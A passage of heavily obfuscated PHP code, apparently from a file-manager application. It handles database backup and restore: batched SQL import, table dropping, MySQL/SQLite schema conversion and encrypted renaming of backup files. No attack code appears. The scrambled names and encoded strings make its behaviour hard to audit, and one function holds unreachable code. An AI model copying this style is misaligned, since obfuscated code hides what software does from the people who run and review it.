($¥Ï¯àîè == $å¸Ä»¨ú); fclose($¸ŞüşŒ¢); return $µÕ˜Åò; } public function sqlToDb($“ëÚëä›, &$½éÖúÃ˜) { $…§æ†õ´ =& $_SERVER[öæÛ¿©¿]; $Ñòœ±™ = $this->model()->db(); $‰¢ˆ²“½ = @fopen($“ëÚëä›, $…§æ†õ´[1189]); if (!$‰¢ˆ²“½) { return !1; } $¥¡î—ş¢ = 0; $¶¦áóîÀ = $…§æ†õ´[12]; $µ»»åÃ¤ = array(); $šæ¶Š® = $this->dbType(); $Ş€Ï± = $šæ¶Š® == $…§æ†õ´[13] ? 500 : 2000; $¬ˆø¢æ = basename($“ëÚëä›, $…§æ†õ´[885]); $¦”òêùÂ = 0; $¿ƒŸ¢îé = 4194304; while (!feof($‰¢ˆ²“½)) { $Õ§ÃÈ×È = trim(fgets($‰¢ˆ²“½)); if (!$Õ§ÃÈ×È) { continue; } $˜‡¿×Â = $this->sqlDecode($Õ§ÃÈ×È, $šæ¶Š®, $¬ˆø¢æ); if (stripos($˜‡¿×Â, $…§æ†õ´[431]) === 0) { if (!$¶¦áóîÀ) { $¶¦áóîÀ = $˜‡¿×Â . $…§æ†õ´[53]; } continue; } if ($½éÖúÃ˜) { $½éÖúÃ˜->task[$…§æ†õ´[1174]] += 1; } $¥¡î—ş¢++; $µ»»åÃ¤[] = rtrim(rtrim(trim($˜‡¿×Â), $…§æ†õ´[50]), $…§æ†õ´[74]); $ıÄÑŞÂ = null; $˜ñ±¬æ² = strlen($˜‡¿×Â); $¦”òêùÂ += $˜ñ±¬æ²; $š’”ÍË˜ = strlen($¶¦áóîÀ) + $¦”òêùÂ + (count($µ»»åÃ¤) - 1); if ($š’”ÍË˜ >= $¿ƒŸ¢îé) { $ıÄÑŞÂ = array_pop($µ»»åÃ¤); if ($¥¡î—ş¢ > 1) { $¥¡î—ş¢--; } } if ($¥¡î—ş¢ >= $Ş€Ï± || $ıÄÑŞÂ) { $˜‡¿×Â = $¶¦áóîÀ . implode($…§æ†õ´[50], $µ»»åÃ¤); if (!$Ñòœ±™->execute($˜‡¿×Â)) { return !1; } if ($½éÖúÃ˜) { $½éÖúÃ˜->update($¥¡î—ş¢); } $µ»»åÃ¤ = array(); $¥¡î—ş¢ = 0; $¦”òêùÂ = 0; if ($ıÄÑŞÂ) { $µ»»åÃ¤ = array($ıÄÑŞÂ); $¥¡î—ş¢ = 1; $¦”òêùÂ = $˜ñ±¬æ²; } } } fclose($‰¢ˆ²“½); if (!empty($µ»»åÃ¤)) { $˜‡¿×Â = $¶¦áóîÀ . implode($…§æ†õ´[50], $µ»»åÃ¤); if (!$Ñòœ±™->execute($˜‡¿×Â)) { return !1; } if ($½éÖúÃ˜) { $½éÖúÃ˜->update($¥¡î—ş¢); } } return !0; } public function dropTable($ÊÊ¹İø¿ = null) { $™Ê¸é  =& $_SERVER[öæÛ¿©¿]; $Ç±æÑƒô = $this->model()->db(); $ÌÁİ—·¾ = $ÊÊ¹İø¿ ? array($ÊÊ¹İø¿) : $Ç±æÑƒô->getTables(); if (!$ÌÁİ—·¾) { return; } foreach ($ÌÁİ—·¾ as $ÊÊ¹İø¿) { if ($ÊÊ¹İø¿) { $ÊÊ¹İø¿ = strtolower($ÊÊ¹İø¿); } else { continue; } $Ç±æÑƒô->execute($™Ê¸é [1190] . $this->escapeName($ÊÊ¹İø¿) . $™Ê¸é [1191]); } } private function sqlEncode($€«ëß€) { $õò¶áˆ =& $_SERVER[öæÛ¿©¿]; $Êû‹ß‹ = array(); foreach ($€«ëß€ as $ïÍÁ¨ìè) { if (is_array($ïÍÁ¨ìè)) { $ïÍÁ¨ìè = json_encode_force($ïÍÁ¨ìè); } $ïÍÁ¨ìè = addslashes($ïÍÁ¨ìè); $ïÍÁ¨ìè = str_replace(array($õò¶áˆ[1192], $õò¶áˆ[286], $õò¶áˆ[418]), array($õò¶áˆ[1193], $õò¶áˆ[1194], $õò¶áˆ[1195]), $ïÍÁ¨ìè); $Êû‹ß‹[] = $ïÍÁ¨ìè; } return $õò¶áˆ[58] . implode($õò¶áˆ[1196], $Êû‹ß‹) . $õò¶áˆ[58]; } private function sqlDecode($Í²ÁÄ¹Â, $ïšâœ«â, $Ÿô”€î÷ = '') { $©¬¾Ş„¾ =& $_SERVER[öæÛ¿©¿]; $Í²ÁÄ¹Â = str_replace(array($©¬¾Ş„¾[1193], $©¬¾Ş„¾[1194], $©¬¾Ş„¾[1195]), array($©¬¾Ş„¾[1192], $©¬¾Ş„¾[286], $©¬¾Ş„¾[418]), $Í²ÁÄ¹Â); if ($ïšâœ«â == $©¬¾Ş„¾[13]) { $Í²ÁÄ¹Â = str_ireplace($©¬¾Ş„¾[1197], $©¬¾Ş„¾[59], $Í²ÁÄ¹Â); $Í²ÁÄ¹Â = stripslashes($Í²ÁÄ¹Â); } return preg_replace($©¬¾Ş„¾[1198], $©¬¾Ş„¾[12], $Í²ÁÄ¹Â); if ($ïšâœ«â == $©¬¾Ş„¾[13]) { return $Ÿô”€î÷ != $©¬¾Ş„¾[879] ? stripslashes($Í²ÁÄ¹Â) : $Í²ÁÄ¹Â; } if ($Ÿô”€î÷ == $©¬¾Ş„¾[879]) { $Í²ÁÄ¹Â = str_replace($©¬¾Ş„¾[1199], $©¬¾Ş„¾[119], stripslashes($Í²ÁÄ¹Â)); } return $Í²ÁÄ¹Â; } public function getSqlFile($ŞµÔàš¿ = '') { $æ©ò·Ÿ =& $_SERVER[öæÛ¿©¿]; $‡øÔÛßµ = $this->dbType(!0); $¦·÷¿³Ë = CONTROLLER_DIR . "\151\x6e\x73\x74\x61\x6c\x6c\57\144\x61\x74\x61\57{$‡øÔÛßµ}\x2e\x73\x71\154"; if (!file_exists($¦·÷¿³Ë)) { return !1; } $ÊîÚ„àĞ = file_get_contents($¦·÷¿³Ë); $îÙÑ“î = $æ©ò·Ÿ[1200] . ($‡øÔÛßµ == $æ©ò·Ÿ[896] ? $æ©ò·Ÿ[1201] : $æ©ò·Ÿ[1202]) . $æ©ò·Ÿ[1203]; preg_match_all($îÙÑ“î, $ÊîÚ„àĞ, $€é•šŸ); $ÆÁ·Á’™ = $€é•šŸ[1]; $ª£„®µÊ = $this->model()->db(); $¬™å¸÷‘ = $ª£„®µÊ->getTables(); $èùà®Ë½ = TEMP_FILES . $æ©ò·Ÿ[1204] . date($æ©ò·Ÿ[260]) . $æ©ò·Ÿ[8]; del_dir($èùà®Ë½); mk_dir($èùà®Ë½); $³§ÕÒ…Û = $èùà®Ë½ . $æ©ò·Ÿ[1205]; $Áõ²ÁÛ = $èùà®Ë½ . $æ©ò·Ÿ[1206]; $¾äÈ‡Š = $‡øÔÛßµ == $æ©ò·Ÿ[13] ? $æ©ò·Ÿ[896] : $æ©ò·Ÿ[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\x61\154\x6c\x2f\x64\141\164\141\57{$¾äÈ‡Š}\56\163\161\x6c", $èùà®Ë½); @touch($èùà®Ë½ . $‡øÔÛßµ . $æ©ò·Ÿ[885]); $‡»øı· = fopen($³§ÕÒ…Û, $æ©ò·Ÿ[1178]); $†ò±à = fopen($Áõ²ÁÛ, $æ©ò·Ÿ[1178]); if ($‡øÔÛßµ == $æ©ò·Ÿ[13]) { $¬™å¸÷‘ = array_diff($¬™å¸÷‘, array($æ©ò·Ÿ[877], $æ©ò·Ÿ[878])); $Ïöé”ô = array($æ©ò·Ÿ[1207], $æ©ò·Ÿ[1208], $æ©ò·Ÿ[1209]); fwrite($†ò±à, implode(PHP_EOL, $Ïöé”ô) . PHP_EOL . PHP_EOL); foreach ($¬™å¸÷‘ as $°˜€¤›) { $íÖ˜œ“ô = $this->sqlFromSqlite($°˜€¤›); if (!$íÖ˜œ“ô[$æ©ò·Ÿ[13]]) { continue; } fwrite($†ò±à, $íÖ˜œ“ô[$æ©ò·Ÿ[13]] . PHP_EOL . PHP_EOL); if (!in_array($°˜€¤›, $ÆÁ·Á’™)) { fwrite($‡»øı·, $íÖ˜œ“ô[$æ©ò·Ÿ[896]] . PHP_EOL . PHP_EOL); } } } else { foreach ($¬™å¸÷‘ as $°˜€¤›) { $íÖ˜œ“ô = $this->sqlFromMysql($°˜€¤›); if (!$íÖ˜œ“ô[$æ©ò·Ÿ[896]]) { continue; } fwrite($‡»øı·, $íÖ˜œ“ô[$æ©ò·Ÿ[896]] . PHP_EOL . PHP_EOL); if (!in_array($°˜€¤›, $ÆÁ·Á’™)) { fwrite($†ò±à, $íÖ˜œ“ô[$æ©ò·Ÿ[13]] . PHP_EOL . PHP_EOL); } } } fclose($‡»øı·); fclose($†ò±à); $ÊîÚ„àĞ = array($æ©ò·Ÿ[896] => $³§ÕÒ…Û, $æ©ò·Ÿ[13] => $Áõ²ÁÛ); return $ŞµÔàš¿ ? $ÊîÚ„àĞ[$ŞµÔàš¿] : $ÊîÚ„àĞ; } public function dbType($Ûäòíñé = false) { $»ÛúÀÆŠ =& $_SERVER[öæÛ¿©¿]; $óçœ‰ıé = $Ûäòíñé ? $GLOBALS[$»ÛúÀÆŠ[6]][$»ÛúÀÆŠ[21]] : $this->database; $óçœ‰ıé = array_change_key_case($óçœ‰ıé); $Æ½›•¢ = $óçœ‰ıé[$»ÛúÀÆŠ[1079]]; if ($Æ½›•¢ == $»ÛúÀÆŠ[1076]) { $—–›‘€ = explode($»ÛúÀÆŠ[4], $óçœ‰ıé[$»ÛúÀÆŠ[1085]]); $Æ½›•¢ = $—–›‘€[0]; } $Áı©ıÊÜ = array($»ÛúÀÆŠ[1210] => $»ÛúÀÆŠ[13], $»ÛúÀÆŠ[1024] => $»ÛúÀÆŠ[896]); if (isset($Áı©ıÊÜ[$Æ½›•¢])) { $Æ½›•¢ = $Áı©ıÊÜ[$Æ½›•¢]; } return $Æ½›•¢; } public function sqlFromMysql($ßò÷Ò‰š, $ûìÈ„ûë = '') { $™ãäØ =& $_SERVER[öæÛ¿©¿]; $İ¡ƒ‘· = array($™ãäØ[896] => $™ãäØ[12], $™ãäØ[13] => $™ãäØ[12]); $½ü³÷’ş = $this->escapeName($ßò÷Ò‰š); $À¨é½èé = $this->escapeName($ßò÷Ò‰š, $™ãäØ[13]); $ÑÊ¿ç– = $this->model()->db(); $Ïî€òŠÀ = $ÑÊ¿ç–->query("\x73\150\157\x77\40\143\162\145\x61\164\x65\40\x74\x61\x62\154\x65\x20{$½ü³÷’ş}\73"); if (!$Ïî€òŠÀ || !$Ïî€òŠÀ[0]) { return !1; } $¹¨ã±· = _get($Ïî€òŠÀ[0], $™ãäØ[1211], $™ãäØ[12]); if (!$¹¨ã±·) { return !1; } $Ñ–‡µß¥ = "\x44\122\117\x50\x20\x54\101\x42\x4c\x45\x20\111\106\40\x45\130\x49\123\124\x53\40{$½ü³÷’ş}\x3b" . PHP_EOL . $¹¨ã±· . $™ãäØ[74]; if ($ûìÈ„ûë == $™ãäØ[896]) { return $Ñ–‡µß¥; } $İ¡ƒ‘·[$™ãäØ[896]] = $Ñ–‡µß¥; $·ğ÷ÈÔÃ = array_change_key_case($GLOBALS[$™ãäØ[6]][$™ãäØ[21]]); $ïÂŸ—ñÒ = $·ğ÷ÈÔÃ[$™ãäØ[1084]]; $†§ŞÏ¼À = $™ãäØ[1212] . $ïÂŸ—ñÒ . "\47\40\101\x4e\x44\x20\124\101\x42\114\105\x5f\116\x41\x4d\x45\x20\x3d\40{$À¨é½èé}\x3b"; $ÅÙ™µ = "\x53\110\117\x57\40\x49\116\x44\x45\x58\x20\x46\x52\x4f\x4d\40{$½ü³÷’ş}\x3b"; $ùó¦«•¬ = $ÑÊ¿ç–->query($†§ŞÏ¼À); if (empty($ùó¦«•¬)) { return $ûìÈ„ûë ? $İ¡ƒ‘·[$ûìÈ„ûë] : $İ¡ƒ‘·; } $ÇôìáŒÊ = $ÑÊ¿ç–->query($ÅÙ™µ); $²éï‘‘æ = $™ãäØ[12]; $Æ¹ÀóÇû = array(); foreach ($ÇôìáŒÊ as $İ³–Û) { if (!$²éï‘‘æ && $İ³–Û[$™ãäØ[1213]] == $™ãäØ[1214]) { $²éï‘‘æ = $İ³–Û[$™ãäØ[1215]]; } if (isset($Æ¹ÀóÇû[$İ³–Û[$™ãäØ[1213]]])) { $Æ¹ÀóÇû[$İ³–Û[$™ãäØ[1213]]][$™ãäØ[1216]][] = $İ³–Û[$™ãäØ[1215]]; continue; } $Æ¹ÀóÇû[$İ³–Û[$™ãäØ[1213]]] = array($™ãäØ[1217] => $İ³–Û[$™ãäØ[1213]], $™ãäØ[1216] => array($İ³–Û[$™ãäØ[1215]]), $™ãäØ[1218] => $İ³–Û[$™ãäØ[1219]] == $™ãäØ[91] ? 0 : 1); } $ƒ…ùÛœã = array(); foreach ($Æ¹ÀóÇû as $İ³–Û) { $‡¶‘ÓáŸ = $İ³–Û[$™ãäØ[1217]] == $™ãäØ[1214]; $ÇÆ¸—íÕ = $İ³–Û[$™ãäØ[1218]] == $™ãäØ[91] && !$‡¶‘ÓáŸ ? $™ãäØ[1220] : $™ãäØ[12]; $ŸÔÊ¦à = $™ãäØ[1221] . $ßò÷Ò‰š . $™ãäØ[11] . ($‡¶‘ÓáŸ ? $™ãäØ[1222] : $İ³–Û[$™ãäØ[1217]]); $ù¬–ª¡ã = $™ãäØ[1223] . implode($™ãäØ[1224], $İ³–Û[$™ãäØ[1216]]) . $™ãäØ[1225]; $ƒ…ùÛœã[] = sprintf($™ãäØ[1226], $™ãäØ[1227], $ÇÆ¸—íÕ, $™ãäØ[1228], $ŸÔÊ¦à, $™ãäØ[1229], $ßò÷Ò‰š, $ù¬–ª¡ã); } $¢Ì¶ê·ß = array(); $†ÚöšË = array($™ãäØ[1230] => $™ãäØ[391], $™ãäØ[1231] => $™ãäØ[391], $™ãäØ[365] => $™ãäØ[391], $™ãäØ[364] => $™ãäØ[391], $™ãäØ[1232] => $™ãäØ[1233], $™ãäØ[1234] => $™ãäØ[1233], $™ãäØ[1233] => $™ãäØ[1233], $™ãäØ[1235] => $™ãäØ[1233], $™ãäØ[283] => $™ãäØ[1233], $™ãäØ[1236] => $™ãäØ[1233], $™ãäØ[1237] => $™ãäØ[1233], $™ãäØ[1238] => $™ãäØ[1239], $™ãäØ[366] => $™ãäØ[1239], $™ãäØ[367] => $™ãäØ[1239], $™ãäØ[1240] => $™ãäØ[1240]); foreach ($ùó¦«•¬ as $İ³–Û) { $ûìÈ„ûë = _get($†ÚöšË, $İ³–Û[$™ãäØ[1241]], $İ³–Û[$™ãäØ[1242]]); $‹ü¦ÉšÅ = $İ³–Û[$™ãäØ[1243]] == $™ãäØ[1007] ? $™ãäØ[1244] : $™ãäØ[1245]; $ËÍÂáš = $İ³–Û[$™ãäØ[1246]] == $²éï‘‘æ ? $™ãäØ[1247] : $™ãäØ[12]; $õæš®òÃ = $İ³–Û[$™ãäØ[1061]] ? strtoupper(str_replace($™ãäØ[11], $™ãäØ[12], $İ³–Û[$™ãäØ[1061]])) : $™ãäØ[12]; $¢Ì¶ê·ß[] = sprintf($™ãäØ[1248], $İ³–Û[$™ãäØ[1246]], $ûìÈ„ûë, $‹ü¦ÉšÅ, $ËÍÂáš, $õæš®òÃ); } $‡†Õäµ = array("\104\122\117\x50\40\x54\x41\x42\x4c\105\40\111\106\40\x45\x58\x49\x53\x54\x53\x20{$À¨é½èé}\73", "\103\x52\x45\x41\124\105\x20\x54\101\x42\x4c\105\x20{$À¨é½èé}\40\50", implode($™ãäØ[50] . PHP_EOL, $¢Ì¶ê·ß), $™ãäØ[1249]); $¸èÇµ†Ú = implode(PHP_EOL, array_merge($‡†Õäµ, $ƒ…ùÛœã)); if ($ûìÈ„ûë == $™ãäØ[13]) { return $¸èÇµ†Ú; } $İ¡ƒ‘·[$™ãäØ[13]] = $¸èÇµ†Ú; return $İ¡ƒ‘·; } public function sqlFromSqlite($Øãâî—À, $ûš„¸œı = '') { $ºÅÓ«Ê× =& $_SERVER[öæÛ¿©¿]; $¾”ŸñÇÅ = array($ºÅÓ«Ê×[896] => $ºÅÓ«Ê×[12], $ºÅÓ«Ê×[13] => $ºÅÓ«Ê×[12]); $œÅÆİê = $this->escapeName($Øãâî—À); $ Ê½ıéÊ = $this->escapeName($Øãâî—À, $ºÅÓ«Ê×[13]); $ğşåç†‡ = $this->model()->db(); $¸Ü˜Íª‹ = "\x50\122\x41\107\x4d\101\x20\124\101\x42\x4c\x45\x5f\x49\x4e\106\117\x20\50\x27{$Øãâî—À}\47\x29"; $ÇÖ–ùÏú = "\x53\x45\114\105\103\124\40\52\x20\x46\122\x4f\x4d\x20\x73\161\154\x69\x74\145\x5f\x6d\x61\x73\164\145\162\x20\127\110\105\x52\105\x20\x74\x62\154\x5f\x6e\x61\155\x65\40\x3d\40\47{$Øãâî—À}\47"; $¹¦ ¶¼á = $ğşåç†‡->query($¸Ü˜Íª‹); if (empty($¹¦ ¶¼á)) { return $ûš„¸œı ? $¾”ŸñÇÅ[$ûš„¸œı] : $¾”ŸñÇÅ; } $Çƒ¥º¾‘ = $ğşåç†‡->query($ÇÖ–ùÏú); $åÕş÷Š² = $–İáßÑ = array(); foreach ($Çƒ¥º¾‘ as $¦…­ÒÄÔ) { if ($¦…­ÒÄÔ[$ºÅÓ«Ê×[33]] == $ºÅÓ«Ê×[358]) { $åÕş÷Š²[] = $¦…­ÒÄÔ[$ºÅÓ«Ê×[1250]]; } else { $–İáßÑ[] = $¦…­ÒÄÔ[$ºÅÓ«Ê×[1250]]; } } $“»áëÕ„ = array_merge(array("\104\122\x4f\x50\x20\124\101\102\x4c\105\x20\111\106\x20\105\130\111\123\124\x53\x20{$ Ê½ıéÊ}\x3b"), $åÕş÷Š², $–İáßÑ); $“»áëÕ„ = implode($ºÅÓ«Ê×[74] . PHP_EOL, $“»áëÕ„) . $ºÅÓ«Ê×[74]; if ($ûš„¸œı == $ºÅÓ«Ê×[13]) { return $“»áëÕ„; } $¾”ŸñÇÅ[$ºÅÓ«Ê×[13]] = $“»áëÕ„; $‹°ì÷¡ = $¤Ä õÙñ = array(); $Â’úï© = array(); $ûõİ‚îº = array(); foreach ($Çƒ¥º¾‘ as $¦…­ÒÄÔ) { if ($¦…­ÒÄÔ[$ºÅÓ«Ê×[33]] == $ºÅÓ«Ê×[1251]) { $à‘“¾ØÃ = $¦…­ÒÄÔ[$ºÅÓ«Ê×[1250]]; $Ş‚êÁå¤ = stripos($à‘“¾ØÃ, $ºÅÓ«Ê×[1220]) !== !1; $·–†ù¬Ë = stripos($à‘“¾ØÃ, $ºÅÓ«Ê×[1214]) !== !1; preg_match($ºÅÓ«Ê×[1252], $à‘“¾ØÃ, $ºÌæ®çš); if (empty($ºÌæ®çš)) { continue; } $‰üóúï€ = array_map($ºÅÓ«Ê×[1253], explode($ºÅÓ«Ê×[50], $ºÌæ®çš[1])); $õ‰—éÓ— = array(); foreach ($‰üóúï€ as $ò¼®‘æ) { $®¸»‚¿³ = trim($ò¼®‘æ, $ºÅÓ«Ê×[1254]); $õ‰—éÓ—[] = $®¸»‚¿³; $Â’úï©[$®¸»‚¿³] = !0; } $ûõİ‚îº[] = array($ºÅÓ«Ê×[32] => $¦…­ÒÄÔ[$ºÅÓ«Ê×[32]], $ºÅÓ«Ê×[1250] => $à‘“¾ØÃ, $ºÅÓ«Ê×[1255] => $Ş‚êÁå¤, $ºÅÓ«Ê×[1256] => $·–†ù¬Ë, $ºÅÓ«Ê×[1257] => $õ‰—éÓ—); } } $ ÏĞ™‡ú = array($ºÅÓ«Ê×[1231] => $ºÅÓ«Ê×[1231], $ºÅÓ«Ê×[391] => $ºÅÓ«Ê×[1258], $ºÅÓ«Ê×[1239] => $ºÅÓ«Ê×[1259], $ºÅÓ«Ê×[1233] => $ºÅÓ«Ê×[1233], $ºÅÓ«Ê×[1240] => $ºÅÓ«Ê×[1260], $ºÅÓ«Ê×[1261] => $ºÅÓ«Ê×[1262]); $¨ÎÌÚ‡ = array($ºÅÓ«Ê×[451], $ºÅÓ«Ê×[169], $ºÅÓ«Ê×[536]); $†ß¥Õíò = array($ºÅÓ«Ê×[391], $ºÅÓ«Ê×[1239], $ºÅÓ«Ê×[1261], $ºÅÓ«Ê×[1231]); foreach ($¹¦ ¶¼á as $¦…­ÒÄÔ) { $Ä¬ñÄ¸ = $¦…­ÒÄÔ[$ºÅÓ«Ê×[32]]; $éÁæáÑ = strtolower($¦…­ÒÄÔ[$ºÅÓ«Ê×[33]]); if ($éÁæáÑ == $ºÅÓ«Ê×[1233] && isset($Â’úï©[$Ä¬ñÄ¸])) { $ûš„¸œı = in_array($Ä¬ñÄ¸, $¨ÎÌÚ‡) ? $ºÅÓ«Ê×[1233] : $ºÅÓ«Ê×[1263]; } else { $ûš„¸œı = _get($ ÏĞ™‡ú, $éÁæáÑ, $éÁæáÑ); } if ($¦…­ÒÄÔ[$ºÅÓ«Ê×[57]] > 0) { $¤Ä õÙñ[$¦…­ÒÄÔ[$ºÅÓ«Ê×[57]]] = $Ä¬ñÄ¸; } $ƒ¥Ãõ§ã = $ºÅÓ«Ê×[12]; if ($¦…­ÒÄÔ[$ºÅÓ«Ê×[56]] !== null) { $Ğ´É‡ˆ = $¦…­ÒÄÔ[$ºÅÓ«Ê×[56]]; if (in_array($éÁæáÑ, $†ß¥Õíò) && is_numeric($Ğ´É‡ˆ)) { $ƒ¥Ãõ§ã = "\x44\x45\x46\101\x55\114\x54\40{$Ğ´É‡ˆ}"; } else { if (strtolower($Ğ´É‡ˆ) === $ºÅÓ«Ê×[104]) { $ƒ¥Ãõ§ã = $¦…­ÒÄÔ[$ºÅÓ«Ê×[35]] ? $ºÅÓ«Ê×[12] : $ºÅÓ«Ê×[1245]; } else { $¬šüŒš = is_numeric($Ğ´É‡ˆ) ? $Ğ´É‡ˆ : $ºÅÓ«Ê×[58] . addslashes($Ğ´É‡ˆ) . $ºÅÓ«Ê×[58]; $ƒ¥Ãõ§ã = "\x44\x45\x46\101\x55\114\x54\40{$¬šüŒš}"; } } } $ÛÔà¶Éç = $¦…­ÒÄÔ[$ºÅÓ«Ê×[35]] ? $ºÅÓ«Ê×[1244] : $ºÅÓ«Ê×[1264]; $Êâ¬ğ×ş = stripos($éÁæáÑ, $ºÅÓ«Ê×[365]) !== !1 && $¦…­ÒÄÔ[$ºÅÓ«Ê×[57]] ? $ºÅÓ«Ê×[1265] : $ºÅÓ«Ê×[12]; $‹°ì÷¡[] = sprintf($ºÅÓ«Ê×[1266], $Ä¬ñÄ¸, $ûš„¸œı, $ÛÔà¶Éç, $ƒ¥Ãõ§ã, $Êâ¬ğ×ş); } if (!empty($¤Ä õÙñ)) { ksort($¤Ä õÙñ); $³¤ÇÄ’ = $ºÅÓ«Ê×[472] . implode($ºÅÓ«Ê×[1186], $¤Ä õÙñ) . $ºÅÓ«Ê×[472]; $‹°ì÷¡[] = "\120\122\111\x4d\101\x52\131\40\x4b\105\131\x20\50{$³¤ÇÄ’}\51"; } foreach ($ûõİ‚îº as $ÆˆªõÖú) { if ($ÆˆªõÖú[$ºÅÓ«Ê×[1256]]) { continue; } $¡¿òºÒ‘ = array(); foreach ($ÆˆªõÖú[$ºÅÓ«Ê×[1257]] as $ò¼®‘æ) { $ ÏĞ™‡ú = null; foreach ($¹¦ ¶¼á as $ØæÜâ²Á) { if ($ØæÜâ²Á[$ºÅÓ«Ê×[32]] == $ò¼®‘æ) { $ ÏĞ™‡ú = strtolower($ØæÜâ²Á[$ºÅÓ«Ê×[33]]); break; } } if ($ ÏĞ™‡ú == $ºÅÓ«Ê×[1233] && in_array($ò¼®‘æ, $¨ÎÌÚ‡)) { $¡¿òºÒ‘[] = "\x60{$ò¼®‘æ}\140\x28\x32\x35\60\51"; } else { $¡¿òºÒ‘[] = "\x60{$ò¼®‘æ}\140"; } } $éÁæáÑ = ($ÆˆªõÖú[$ºÅÓ«Ê×[1255]] ? $ºÅÓ«Ê×[1267] : $ºÅÓ«Ê×[12]) . $ºÅÓ«Ê×[1268]; $Êªß¹¯Ö = str_replace($ºÅÓ«Ê×[1221] . $Øãâî—À . $ºÅÓ«Ê×[11], $ºÅÓ«Ê×[12], $ÆˆªõÖú[$ºÅÓ«Ê×[32]]); $Êªß¹¯Ö = str_replace($Øãâî—À . $ºÅÓ«Ê×[11], $ºÅÓ«Ê×[12], $Êªß¹¯Ö); $‹°ì÷¡[] = "{$éÁæáÑ}\40\140{$Êªß¹¯Ö}\x60\40\x28" . implode($ºÅÓ«Ê×[50], $¡¿òºÒ‘) . $ºÅÓ«Ê×[1185]; } $ï±­Œ¯’ = array("\x44\x52\117\120\x20\124\x41\x42\114\105\40\x49\x46\x20\105\130\x49\123\124\123\40{$œÅÆİê}\x3b", "\103\x52\105\101\124\x45\40\x54\x41\102\x4c\x45\40{$œÅÆİê}\40\x28", implode($ºÅÓ«Ê×[50] . PHP_EOL, $‹°ì÷¡), $ºÅÓ«Ê×[1269]); $ï±­Œ¯’ = implode(PHP_EOL, $ï±­Œ¯’); if ($ûš„¸œı == $ºÅÓ«Ê×[896]) { return $ï±­Œ¯’; } $¾”ŸñÇÅ[$ºÅÓ«Ê×[896]] = $ï±­Œ¯’; return $¾”ŸñÇÅ; } private function escapeName($°´ùşØË, $ÕÍù¤‡Ú = "\155\171\x73\x71\x6c") { $öËÆ Ë¨ =& $_SERVER[öæÛ¿©¿]; $°´ùşØË = preg_replace($öËÆ Ë¨[1270], $öËÆ Ë¨[12], $°´ùşØË); if ($ÕÍù¤‡Ú === $öËÆ Ë¨[896]) { return "\x60{$°´ùşØË}\x60"; } return "\42{$°´ùşØË}\42"; } public function mixBakList($úĞ‚º­) { $¿âã–†¤ =& $_SERVER[öæÛ¿©¿]; $úĞ‚º­ = rtrim($úĞ‚º­, $¿âã–†¤[8]) . $¿âã–†¤[8]; $÷£ÍŸìî = $¿âã–†¤[1271]; $ÉÒŒæØ¨ = IO::listPath($úĞ‚º­); if (empty($ÉÒŒæØ¨[$¿âã–†¤[86]])) { return !1; } $–‡÷­Ó = array(); foreach ($ÉÒŒæØ¨[$¿âã–†¤[86]] as $ª½å¥€» => $¦ïÕÙß) { if (!$¦ïÕÙß[$¿âã–†¤[32]] || !$¦ïÕÙß[$¿âã–†¤[87]]) { continue; } $ñÑèã²ˆ = Mcrypt::encode($¦ïÕÙß[$¿âã–†¤[32]], $÷£ÍŸìî); $®¿Ëòæ = md5($ñÑèã²ˆ); IO::rename($¦ïÕÙß[$¿âã–†¤[87]], $®¿Ëòæ); $–‡÷­Ó[$®¿Ëòæ] = $ñÑèã²ˆ; } $§Ù®œÏ„ = md5($¿âã–†¤[1272] . $÷£ÍŸìî); IO::setContent($úĞ‚º­ . $§Ù®œÏ„, json_encode($–‡÷­Ó)); return !0; } public function unmixBakList($æ·íìŞï) { $ù¨‘Ÿæø =& $_SERVER[öæÛ¿©¿]; $æ·íìŞï = rtrim($æ·íìŞï, $ù¨‘Ÿæø[8]) . $ù¨‘Ÿæø[8]; $Éï‰§ = $this->unmixBakListGet($æ·íìŞï, !0); if (empty($Éï‰§)) { return !1; } foreach ($Éï‰§ as $ëìÓÛ›ş => $¹¤§¡ƒî) { $­åÖ£œõ = IO::rename($æ·íìŞï . $¹¤§¡ƒî, $ëìÓÛ›ş); if (!$­åÖ£œõ) { return !1; } } return !0; } public function unmixBakListGet($óÒß¨¨, $â—¿ùøØ = false) { $­—³™ß =& $_SERVER[öæÛ¿©¿]; $óÒß¨¨ = rtrim($óÒß¨¨, $­—³™ß[8]) . $­—³™ß[8]; $Ÿ­Ğê–Ë = $­—³™ß[1271]; $üÉô°Ì¼ = md5($­—³™ß[1272] . $Ÿ­Ğê–Ë); $¼¹Íë•Ü = $óÒß¨¨ . $üÉô°Ì¼; if (!IO::exist($¼¹Íë•Ü)) { return !1; } $€±áÃœº = json_decode(IO::getContent($¼¹Íë•Ü), !0); if (empty($€±áÃœº)) { return !1; } $»Ë­¾·Ú = array(); foreach ($€±áÃœº as $ÌÀÇœäˆ => $“ÒôÚî¿) { $üÉô°Ì¼ = Mcrypt::decode($“ÒôÚî¿, $Ÿ­Ğê–Ë); $»Ë­¾·Ú[$üÉô°Ì¼] = $ÌÀÇœäˆ; } if ($â—¿ùøØ) { IO::remove($¼¹Íë•Ü, !1); } return $»Ë­¾·Ú; } } goto e½Ãë‹¾É¹; AÑŠ¾ù‰„: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ëè„¸ù÷, $ŸàæšÂ = 0) { parent::__construct(); $this->source = $ëè„¸ù÷; $this->sourceSize = $ŸàæšÂ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Á´¥íë€ = false) { return $this->sourceSize; } public function getContent($½™À—ì = false) { return $this->fileSubstr($½™À—ì, 0, $this->sourceSize); } public function fileSubstr($­››®Ä = false, $±Úüßƒƒ = 0, $’ğòäÒï = 0) { if (!$’ğòäÒï) { $’ğòäÒï = $this->sourceSize; } $¹¿ÍİÁù = $this->sourceSize - $±Úüßƒƒ; if ($’ğòäÒï >= $¹¿ÍİÁù) { $’ğòäÒï = $¹¿ÍİÁù; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $±Úüßƒƒ, $’ğòäÒï); } if ($this->sourceType == self::TYPE_FILE) { if ($’ğòäÒï <= 0) { return $_SERVER[öæÛ¿©¿][12]; } $·÷¿ú”ø = ftell($this->source); fseek_64($this->source, $·÷¿ú”ø + $±Úüßƒƒ); $Ô´ÉóüŞ = @fread($this->source, $’ğòäÒï); fseek_64($this->source, $·÷¿ú”ø); return $Ô´ÉóüŞ; } } public function hashMd5($£Œç’À = false) { return md5($this->getContent()); } public static function 